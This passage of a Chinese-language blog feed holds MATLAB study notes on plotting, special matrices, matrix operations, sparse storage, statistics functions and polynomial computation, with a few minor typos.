src="https://shierjinghuang.github.io/2022/01/10/Matlab/23.png"></p><ol><li><p><strong>compass：</strong><br><code>compass(x,y)</code>：x,y是n维向量，显示n个箭头，箭头的起点为原点，箭头位置为（x(i),y(i)）.<br><code>compazz(z)</code>:参量z为n维复数向量，命令显示n个箭头，箭头起点为原点，箭头位置为（real(z),image(z)）。</p></li><li><p><strong>feather：</strong><br>feather(x,y) :函数绘制由向量参量x与y构成的速度向量，沿水平轴方向，从均匀间隔点以箭头发射出来<br>feather(z) :函数绘制羽毛图。参量z是一个复数，则feather(z)相当于compass(real(z)，imag(z))；</p></li><li><p><strong>quiver函数调用格式:</strong></p><p>quiver(x, y, u, v)其中，(x, y)指定矢量起点，(u, v)指定矢量终点。</p></li></ol><h2 id="三维曲线"><a href="#三维曲线" class="headerlink" title="三维曲线"></a>三维曲线</h2><h3 id="plot3函数"><a href="#plot3函数" class="headerlink" title="plot3函数"></a>plot3函数</h3><p>(1)plot3函数的基本用法：plot3(x,y,z)其中，参数x、y、z组成一组曲线的坐标。</p><p>(2)含多组输入参数的plot3函数： plot3(x1,y1,z1,x2,y2,z2,…,xn,yn,zn)</p><p>每一组x,y,z向量构成 一组数据点的坐标，绘制一条曲线</p><p>(3)含选项的plot3函数： 选项用于指定曲线的线型，颜色和数据点标记。</p><h3 id="fplot3函数"><a href="#fplot3函数" class="headerlink" title="fplot3函数"></a>fplot3函数</h3><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token function">fplot3</span><span class="token punctuation">(</span>funx<span class="token punctuation">,</span>funy<span class="token punctuation">,</span>funz<span class="token punctuation">,</span>tlims<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>其中,funx、funy、funz代表定义曲线x、y、z坐标的函数，通常采用函数句柄的形式。tlims为参数函数自变量的取值范围，用二元向量[tmin，tmax]描述﹐默认为[-5，5]。</p><h2 id="三维曲面"><a href="#三维曲面" class="headerlink" title="三维曲面"></a>三维曲面</h2><h3 id="平面网格数据的生成"><a href="#平面网格数据的生成" class="headerlink" title="平面网格数据的生成"></a>平面网格数据的生成</h3><p>(1)利用矩阵运算生成</p><p>(2)利用meshgrid函数生成，[X,Y]=meshgrid(x,y)；其中，参数x、y为向量，存储网格的X，Y为矩阵</p><h3 id="绘制三维曲面的mesh函数和surf函数"><a href="#绘制三维曲面的mesh函数和surf函数" class="headerlink" title="绘制三维曲面的mesh函数和surf函数"></a>绘制三维曲面的mesh函数和surf函数</h3><ol><li>基本调用格式</li></ol><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token function">mesh</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span class="token function">surf</span><span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">,</span>z<span class="token punctuation">,</span>c<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>其中x、y是网络坐标矩阵，z是网格点上的该网格点上的高度矩阵，c用于指定在不同高度下的曲面颜色。</p><ol start="2"><li>其他调用格式:  mesh(z,c)  surf(z,c) </li></ol><p>当x,y省略时，z矩阵的第2维下标当作x轴坐标，z矩阵的第1维下标当作y轴坐标。</p><ul><li>带等高线的三维网格曲面函数meshc</li><li>带底座的三维网格曲面函数meshz</li><li>具有等高线的曲面函数surfc</li><li>具有光照效果的曲面函数surfl</li></ul><h3 id="标准三维曲面（sphere-cylinder；peaks）"><a href="#标准三维曲面（sphere-cylinder；peaks）" class="headerlink" title="标准三维曲面（sphere;cylinder；peaks）"></a>标准三维曲面（sphere;cylinder；peaks）</h3><p>(1) sphere函数 [x,y,z]=sphere(n)</p><p>(2)cylinder函数 [x,y,z]=cylinder(R,n)</p><p>面和柱面。<br>sphere将产生3个n+1阶的方阵，可以绘制出圆心位于原点，半径为1的单位球体，如果调用该函数时，不带输出参数，则直接绘制球面，n决定球面圆滑程度，默认20，n越大，越光滑。<br>cyinder函数的R是一个向量，<strong>存放柱面各个等间隔高度上的半径</strong>，n表示在圆柱圆周上有n个间隔点，默认20个，n越大，越滑。如果R是一个标量，则生成一个圆柱面。</p><p>(3)peaks函数 </p><p><img src="D:\blog\shierjinghuang\source_posts\Matlab\24.png"></p><p>peak(n):参数为一个标量，生成n阶方阵<br>peaks(V)、peaks(x,y):若参数为向量或网格矩阵代入$f(x,y)$,计算得到高度矩阵，用peaks生成的矩阵，可以用于mesh、surf的参数绘制多峰函数曲面图。</p><h3 id="fsurf函数和fmesh函数"><a href="#fsurf函数和fmesh函数" class="headerlink" title="fsurf函数和fmesh函数"></a>fsurf函数和fmesh函数</h3><h2 id="图形修饰处理"><a href="#图形修饰处理" class="headerlink" title="图形修饰处理"></a>图形修饰处理</h2><h3 id="视点处理-view"><a href="#视点处理-view" class="headerlink" title="视点处理(view)"></a>视点处理(view)</h3><p>视点可由方位角和仰角表示。</p><h3 id="色彩处理-colormap；shading"><a href="#色彩处理-colormap；shading" class="headerlink" title="色彩处理(colormap；shading)"></a>色彩处理(colormap；shading)</h3><ol><li>颜色的向量(RGB)表示：[0 0 1]:蓝色 ，[1 0 0]:红色 ， [0 1 0]:绿色 []</li><li>色图:(Colormap)</li></ol><h3 id="图形的裁剪处理"><a href="#图形的裁剪处理" class="headerlink" title="图形的裁剪处理"></a>图形的裁剪处理</h3><p>将图形中需要裁剪部分对应的函数值设置成NaN，这样在绘制图形时，函数值为NaN的部分将不显示出来,从而达到对图形进行裁剪的目的。</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> Matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Matlab入门(二)</title>
      <link href="/2022/01/12/Matlab2/"/>
      <url>/2022/01/12/Matlab2/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="特殊矩阵："><a href="#特殊矩阵：" class="headerlink" title="特殊矩阵："></a>特殊矩阵：</h2><p>通用性矩阵：</p><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/6.png"></p><p>以上函数调用格式相同，以zeros为例：</p><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/7.png"></p><h3 id="用于专门学科的特殊矩阵"><a href="#用于专门学科的特殊矩阵" class="headerlink" title="用于专门学科的特殊矩阵"></a>用于专门学科的特殊矩阵</h3><p> (1)魔方矩阵<strong>Magic Square</strong><br>n阶魔方阵由1,2,3,…,n2共n2个整数组成，且每行,每列以及主副对角线上各n个元素之和都相等。n阶魔方阵每行每列元素的和为**(1+2+3+…+ n^2)/n=(n+n^3)/2**。MATLAB函数magic(n)产生一个特定的魔方阵 </p><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/8.png"></p><p>在<strong>MATLAB</strong>中，函数vander(V)生成以向量V为基础的范得蒙**(Vandermonde)**矩阵。</p><p>范德蒙矩阵常用于各种通信系统的纠错编码中，</p><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/9.png"></p><p> 在MATLAB中，生成n阶希尔伯特矩阵的函数是hilb（n）</p><p>希尔伯特矩阵正定，且高度病态（即，任何一个元素发生一点变动，整个矩阵的行列式的值和逆矩阵都会发生巨大变化），病态程度和阶数相关。 </p><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/10.png"></p><p>MATLAB生成伴随矩阵的函数是**compan(p)**，其中p是一个多项式的系数向量，高次幂系数排在前，低次幂系数排在后。</p><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/11.png"></p><p>帕斯卡矩阵的第一行元素和第一列元素都为1，其余位置的元素是该元素的左边元素与上面元素相加，即P(i,j)=P(i,j- 1)+P(i-1,j)，且P(i,1)=1,P(1,j)=1。<strong>函数pascal(n)生成一个n阶帕斯卡矩阵。</strong></p><h2 id="矩阵变换"><a href="#矩阵变换" class="headerlink" title="矩阵变换"></a>矩阵变换</h2><h3 id="对角阵："><a href="#对角阵：" class="headerlink" title="对角阵："></a>对角阵：</h3><p>(1)<strong>对角矩阵：</strong>只有对角线上有非零元素的矩阵。</p><p>(2)<strong>数量矩阵：</strong>角线上元素相等的对角矩阵。</p><p>(3)<strong>单位矩阵：</strong>对角线上元素都为1的对角矩阵。</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token function">diag</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>  <span class="token comment">%提取矩阵A主对角线元素，产生一个列向量</span><span class="token function">diag</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>k<span class="token punctuation">)</span> <span class="token comment">%提取矩阵A第k条对角线的元素，产生一个列向量。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>diag函数</strong>也可以构造对角矩阵：</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token function">diag</span><span class="token punctuation">(</span>V<span class="token punctuation">)</span> <span class="token comment">%一向量V为主对角线元素，产生对角矩阵。</span><span class="token function">diag</span><span class="token punctuation">(</span>V<span class="token punctuation">,</span>k<span class="token punctuation">)</span> <span class="token comment">%以向量V为第k条对角线元素，产生对角矩阵。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="三角阵："><a href="#三角阵：" class="headerlink" title="三角阵："></a>三角阵：</h3><p>(1)上三角矩阵:</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token function">triu</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span>  <span class="token comment">%提取矩阵A的主对角线及以上的元素。</span><span class="token function">triu</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span>k<span class="token punctuation">)</span><span class="token comment">%提取矩阵A的第k条对角线及以上的元素。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>(2)下三角矩阵：在MATLAB中，提取矩阵A的下三角矩阵的函数是tril，其用法与triu函数完全相同。</p><h3 id="矩阵的转置："><a href="#矩阵的转置：" class="headerlink" title="矩阵的转置："></a>矩阵的转置：</h3><p>转置运算符是小数点后面接单引号     <strong>.’</strong><br>共扼转置，其运算符是单引号 <strong>‘</strong> 它在转置的基础上还要取每个数的复共轲。 </p><h3 id="矩阵的翻转："><a href="#矩阵的翻转：" class="headerlink" title="矩阵的翻转："></a>矩阵的翻转：</h3><p><strong>rot90(A,k)</strong> :将矩阵A逆时针方向旋转90°的k倍，当k为1时可省略。 </p><p><strong>fliplr(A)</strong> :对矩阵A实施左右翻转。<strong>flipud(A)</strong> :对矩阵A实施上下翻转。</p><h3 id="矩阵的求逆："><a href="#矩阵的求逆：" class="headerlink" title="矩阵的求逆："></a>矩阵的求逆：</h3><p>对于一个方阵A，如果存在一个与其同阶的方阵B，使得AB=BA=l(I为单位矩阵)，则称B为A的逆矩阵，当然，A也是B的逆矩阵。**inv(A) ** :  求方阵A的逆矩阵。</p><h2 id="矩阵求值"><a href="#矩阵求值" class="headerlink" title="矩阵求值"></a>矩阵求值</h2><h3 id="矩阵的行列式"><a href="#矩阵的行列式" class="headerlink" title="矩阵的行列式"></a>矩阵的行列式</h3><p>把一个方阵看作一个行列式，并对其按行列式的规则求值，这个值就称为方阵所对应的行列式的值。<br>det(A):求方阵A所对应的行列式的值。</p><h3 id="矩阵的秩"><a href="#矩阵的秩" class="headerlink" title="矩阵的秩"></a>矩阵的秩</h3><p>矩阵线性无关的行数或列数称为矩阵的秩。rank(A):求矩阵A的秩。 </p><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/12.png"></p><h3 id="矩阵的迹"><a href="#矩阵的迹" class="headerlink" title="矩阵的迹"></a>矩阵的迹</h3><p>矩阵的迹等于矩阵的对角线元素之和，也等于矩阵的特征值之和。</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token function">trace</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span>     <span class="token comment">%求矩阵A的迹。 </span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>向量和矩阵的范数：</strong>矩阵或向量的范数用来度量矩阵或向量在某种意义下的长度。</p><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/13.png"></p><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/14.png"></p><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/15.png"></p><p> MATLAB提供了求3种矩阵范数的函数,其函数调用格式与求向量的范数的函数完全相同。</p><h3 id="矩阵的条件数"><a href="#矩阵的条件数" class="headerlink" title="矩阵的条件数"></a>矩阵的条件数</h3><p>矩阵A的条件数等于A的范数与A的逆矩阵的范数的乘积。条件数越接近于1，矩阵的性能越好，反之，矩阵的性能越差。</p><p>在MATLAB中，计算矩阵A的3种条件数的函数是:</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token function">cond</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span>          <span class="token comment">%计算A的1一范数下的条件数。</span><span class="token function">cond</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span>或<span class="token function">cond</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">%计算A的2—范数下的条件数。</span><span class="token function">cond</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span> <span class="token keyword">inf</span><span class="token punctuation">)</span>       <span class="token comment">%计算A的○o—范数下的条件数。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="矩阵的特征值与特征向量"><a href="#矩阵的特征值与特征向量" class="headerlink" title="矩阵的特征值与特征向量"></a>矩阵的特征值与特征向量</h2><h3 id="矩阵特征值的数学定义"><a href="#矩阵特征值的数学定义" class="headerlink" title="矩阵特征值的数学定义"></a>矩阵特征值的数学定义</h3><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/16.png"></p><h3 id="求矩阵的特征值和特征向量"><a href="#求矩阵的特征值和特征向量" class="headerlink" title="求矩阵的特征值和特征向量"></a>求矩阵的特征值和特征向量</h3><p>函数调用格式有两种：</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">E<span class="token operator">=</span><span class="token function">eig</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span> <span class="token comment">%求矩阵A的全部特征值，构成向量E</span><span class="token punctuation">[</span>X<span class="token punctuation">,</span>D<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">eig</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span> <span class="token comment">%求矩阵A的全部特征值，构成对角阵D，并产生矩阵X，X各列是相应的特征向量。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="稀疏矩阵"><a href="#稀疏矩阵" class="headerlink" title="稀疏矩阵"></a>稀疏矩阵</h3><p>稀疏矩阵指的是零元素个数远远多于非零元素个数的矩阵，如果将大量的零元素也存储起来，必将导致存储空间的浪费。为此，MATLAB为稀疏矩阵提供特殊的存储方式。</p><h3 id="矩阵的存储方式"><a href="#矩阵的存储方式" class="headerlink" title="矩阵的存储方式"></a>矩阵的存储方式</h3><p>1,<strong>完全存储方式</strong></p><p>2,<strong>稀疏存储方式</strong>稀疏存储方式只存储矩阵的非零元素的值及其位置，即行号和列号。注意,采用稀疏存储方式时，矩阵元素的存储顺序并没有改变，也是按列的顺序进行存储。</p><h3 id="稀疏存储方式的产生"><a href="#稀疏存储方式的产生" class="headerlink" title="稀疏存储方式的产生"></a>稀疏存储方式的产生</h3><p>(1)<strong>完全存储方式与稀疏存储方式之间的转化</strong></p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">A<span class="token operator">=</span>sparselS<span class="token punctuation">)</span>  <span class="token comment">%将矩阵S转化为稀疏存储方式的矩阵A。</span>S<span class="token operator">=</span><span class="token function">full</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span>    <span class="token comment">%将矩阵A转化为完全存储方式的矩阵S。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/17.png"></p><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/18.png"></p><p>用A的一行元素表示一个稀疏矩阵的元素，相当于A每一行的每个元素是相应的稀疏矩阵元素的一个信息。这些信息组合经过<code>spconvert</code>就可以得到相应的稀疏矩阵元素。</p><p>(3)<strong>带状稀疏矩阵的稀疏存储</strong><br>稀疏矩阵有两种基本类型:无规则结构的稀疏矩阵与有规则结构的稀疏矩阵。带状稀疏矩阵是指所有非零元素集中在对角线上的矩阵。<br>[B,d]=spdiags(A):从带状稀疏矩阵A中提取全部非零对角线元素赋给矩阵B及其这些非零对角线的位置向量d。<br>A=spdiags(B,d,m,n):产生带状稀疏矩阵的稀疏存储矩阵A，其中m、n为原带状稀疏矩阵的行数与列数，矩阵B的第i列即为原带状稀疏矩阵的第i条非零对角线，向量d为原带状稀疏矩阵所有非零对角线的位置。</p><p>(4)<strong>单位矩阵的稀疏矩阵</strong></p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token function">speye</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span>n<span class="token punctuation">)</span>   <span class="token comment">%返回一个m*n的稀疏存储单位矩阵。</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="稀疏矩阵应用举例"><a href="#稀疏矩阵应用举例" class="headerlink" title="稀疏矩阵应用举例"></a>稀疏矩阵应用举例</h2><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/19.png"></p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab">clc<span class="token punctuation">;</span>clearkf1<span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token comment">% 主对角线以下第一条元素</span>k0 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token number">4</span><span class="token punctuation">;</span><span class="token number">6</span><span class="token punctuation">;</span><span class="token number">6</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token comment">% 主对角线元素</span>k1 <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token number">4</span><span class="token punctuation">;</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token comment">% 主对角线以上第一条元素</span>B <span class="token operator">=</span> <span class="token punctuation">[</span>kf1<span class="token punctuation">,</span>k0<span class="token punctuation">,</span>k1<span class="token punctuation">]</span><span class="token punctuation">;</span>d <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>A <span class="token operator">=</span> <span class="token function">spdiags</span><span class="token punctuation">(</span>B<span class="token punctuation">,</span>d<span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">% 产生稀疏存储的稀疏矩阵</span>f <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token number">3</span><span class="token punctuation">;</span><span class="token number">2</span><span class="token punctuation">;</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>x <span class="token operator">=</span> A<span class="token operator">\</span>f               <span class="token comment">%求出解</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当参与运算的数据对象不全是稀疏储存矩阵时，所以结果是完全存储形式。</p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 学习记录 </tag>
            
            <tag> Matlab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Matlab数据处理</title>
      <link href="/2022/01/12/Matlab%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86/"/>
      <url>/2022/01/12/Matlab%E6%95%B0%E6%8D%AE%E5%A4%84%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h2 id="数据统计分析"><a href="#数据统计分析" class="headerlink" title="数据统计分析"></a>数据统计分析</h2><h3 id="求最大值与最小元素"><a href="#求最大值与最小元素" class="headerlink" title="求最大值与最小元素"></a>求最大值与最小元素</h3><ul><li>max(): 求向量或矩阵的最大元素</li><li>min():求向量或矩阵的最小元素</li></ul><p>当参数为向量时函数有两种调用格式：</p><p>(1) y=max(X):返回向量X的最大值存入y，如果X中包含复数元素，则按模取最大值。</p><p>(2)[y,k]=max(X): 返回向量X的最大值存入y，最大值元素的序号存入k，如果X中包含复数元素，则按模取最大值。</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token comment">%例1:</span>x<span class="token operator">=</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">43</span><span class="token punctuation">,</span><span class="token number">72</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">,</span><span class="token number">23</span><span class="token punctuation">,</span><span class="token number">47</span><span class="token punctuation">]</span><span class="token punctuation">;</span>y<span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">[</span>y<span class="token punctuation">,</span>k<span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>当参数为矩阵时，函数有三种调用格式：</p><p>(1)max(A):返回一个行向量，向量的第i个元素是矩阵A的第i列上的最大值。<br>(2)[Y,U]=max(A):返回行向量Y和U，Y向量记录A的每列的最大值，U向量记录每列最大值元素的行号。<br>( 3 ) max(A,0,dim): dim取1或2。dim取1时，该函数的功能和max(A)完全相同;dim取2时，该函数返回一个列向量，其第i个元素是A矩阵的第i行上的最大值。其中的[]不可省略</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token comment">%例二 求矩阵A的每行及每列的最大元素，并求整个矩阵的最大元素</span><span class="token function">max</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span> <span class="token comment">%求每列的最大值</span><span class="token function">max</span><span class="token punctuation">(</span>A<span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token comment">%将矩阵转置求每行的最大值</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token function">max</span><span class="token punctuation">(</span>A<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">%两次调用max函数，求整个矩阵的最大值</span><span class="token comment">%在实际上，可以通过max(A(:))的调用方式，只用一次max函数就得到最大值。</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="求平均值和中值"><a href="#求平均值和中值" class="headerlink" title="求平均值和中值"></a>求平均值和中值</h3><p>平均值: 指算术平均值，即每项数据之和除以项数。<br>中值: 指在数据序列中其值的大小恰好处在中间的元素。如果数据个数为奇数，则取值为大小位于中间的元素;如果数据个数为偶数，则取中间两个元素的平均值。</p><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token function">mean</span><span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token comment">% 求算术平均值</span>median（）  <span class="token comment">% 求中值 </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="求和与求积"><a href="#求和与求积" class="headerlink" title="求和与求积"></a>求和与求积</h3><pre class="line-numbers language-matlab" data-language="matlab"><code class="language-matlab"><span class="token function">sum</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">% 求和</span>prod（） <span class="token comment">% 求积</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="累加和与累乘积"><a href="#累加和与累乘积" class="headerlink" title="累加和与累乘积"></a>累加和与累乘积</h3><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/25.png"></p><p>cumsum(): 累加和函数 ，cumprod():累乘积函数。</p><h3 id="求标准差与相关系数"><a href="#求标准差与相关系数" class="headerlink" title="求标准差与相关系数"></a>求标准差与相关系数</h3><p><img src="https://img-blog.csdnimg.cn/20200227193437501.png"></p><p>std( ):计算标准差函数。</p><p>调用格式:</p><ol><li>std(X):计算向量X的标准差。</li><li>std(A):计算矩阵A的各列的标准差。</li><li>std(A,flag,dim): flag取0或1，当flag=0时，按S所列公式计算样本标准差;当flag=1时，按Sz所列公式计算总体标准差。默认情况下，flag=0，dim=l。</li></ol><p><img src="https://img-blog.csdnimg.cn/2020022722014543.png"></p><p>corrcoef( ):相关系数函数。</p><p>调用格式:</p><ul><li>corrcoef(A):返回由矩阵A所形成的一个相关系数矩阵，其中,第i行第j列的元素表示原矩阵A中第i列和第j列的相关系数。</li><li>corrcoef(X,Y):在这里，X、Y是向量，它们与corrcoef([X,Y)的作用一样,用于求X、Y向量之间的相关系数。</li></ul><h3 id="排序"><a href="#排序" class="headerlink" title="排序"></a>排序</h3><p><strong>sort( ):排序函数</strong> 调用格式:</p><ul><li>sort(X):对向量X按升序排列。</li><li>[Y,I]=sort(A,dim,mode)</li></ul><p>其中，dim指明对A的列还是行进行排序。mode指明按升序还是降序排序，若取“ascend”，则按升序;若取“descend”，则按降序，默认为升序。输出参数中，Y是排序后的矩阵，而l记录Y中的元素在A中位置。</p><h2 id="多项式计算"><a href="#多项式计算" class="headerlink" title="多项式计算"></a>多项式计算</h2><h3 id="多项式的表示"><a href="#多项式的表示" class="headerlink" title="多项式的表示"></a>多项式的表示</h3><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/26.png"></p><p>在MATLAB中创建多项式向量时，注意三点：</p><ol><li>多项式系数向量的顺序是从高到低。</li><li>多项式系数向量包含0次项系数，所以其长度为多项式最高次数加1。</li><li>如果有的项没有，系数向量相应位置应用0补足。</li></ol><h3 id="多项式的四则运算"><a href="#多项式的四则运算" class="headerlink" title="多项式的四则运算"></a>多项式的四则运算</h3><ol><li>多项式的加减运算      </li></ol><p>多项式的加减运算非常简单，即相应向量相加减。</p><ol start="2"><li>多项式乘法      </li></ol><p>conv (P1,P2):多项式相乘函数，在这里，P1、P2是两个多项式系数向量。</p><ol start="3"><li>多项式除法      </li></ol><p>[Q,r]=deconv(P1,P2):多项式相除i函数。其中，Q返回多项式Pl除以P2的商式，r返回Pl除以P2的余式。这里，Q和r仍是多项式系数向量。deconv是conv的逆函数，因此有Pl=conv(Q,P2)+r</p><h3 id="多项式的求导-polyder"><a href="#多项式的求导-polyder" class="headerlink" title="多项式的求导(polyder)"></a>多项式的求导(polyder)</h3><p>polyder( ):    多项式求导函数。</p><p>调用格式:</p><ol><li>p=polyder(P)   :   求多项式P的导函数。</li><li>p=polyder(P,Q)   :   求P · Q的导函数。</li><li>[p , q]=polyder(P,Q)   :   求P/Q的导函数，导函数的分子存入p，分母存入q。</li></ol><h3 id="多项式积分-polyder"><a href="#多项式积分-polyder" class="headerlink" title="多项式积分(polyder)"></a>多项式积分(polyder)</h3><p><code>q = polyint(p,k)</code> 使用积分常量 k 返回 p 中系数所表示的多项式积分。</p><h3 id="多项式的求值-polyval-polyvalm"><a href="#多项式的求值-polyval-polyvalm" class="headerlink" title="多项式的求值(polyval;polyvalm)"></a>多项式的求值(polyval;polyvalm)</h3><p><img src="https://img-blog.csdnimg.cn/20200227223355703.png"></p><p><strong>polyval(p,x)</strong></p><p>其中，p为多项式系数向量;x可以是标量、向量或矩阵。若x为标量，则求多项式在该点的值;若x为向量或矩阵，则对向量或矩阵中的每个元素求多项式的值。<br><strong>polyvalm(p,x)</strong><br>其调用格式与polyval相同，但含义不同。polyvalm函数要求x为方阵，以方阵为自变量求多项式的值。</p><h3 id="多项式的求根-roots-poly"><a href="#多项式的求根-roots-poly" class="headerlink" title="多项式的求根(roots;poly)"></a>多项式的求根(roots;poly)</h3><p>一元二次多项式求根: <img src="https://shierjinghuang.github.io/2022/01/10/Matlab/27.png"></p><p>一元高次多项式求根： roots(p): 多项式求根函数，其中，p为多项式的系数向量。</p><p>若已知多项式的全部根，则可以用poly函数建立起该多项式，其调用格式为：  p=poly(x)</p><h2 id="数据插值-interp"><a href="#数据插值-interp" class="headerlink" title="数据插值(interp)"></a>数据插值(interp)</h2><p>数据插值可以根据有限个点的取值状况，合理估算出附近其他点的取值，从而节约大量的实验和测试资源，节省大量的人力、物力和财力。</p><h3 id="数据插值的计算机制"><a href="#数据插值的计算机制" class="headerlink" title="数据插值的计算机制"></a>数据插值的计算机制</h3><p><img src="https://shierjinghuang.github.io/2022/01/10/Matlab/28.png"></p><p>interp1( ):一维插值函数。</p><p>调用格式:     <strong>Y=interp1(X,Y,X1,method)</strong></p><p>根据X、Y的值，计算函数在×1处的值。其中，X、Y是两个等长的已知向量，分别表示采样点和采样值。Xl是一个向量或标量，表示要插值的点。</p><h3 id="数据插值的实现方法"><a href="#数据插值的实现方法" class="headerlink" title="数据插值的实现方法"></a>数据插值的实现方法</h3><p>method用于指定插值方法，常用的取值有以下四种:</p><ol><li>linear:    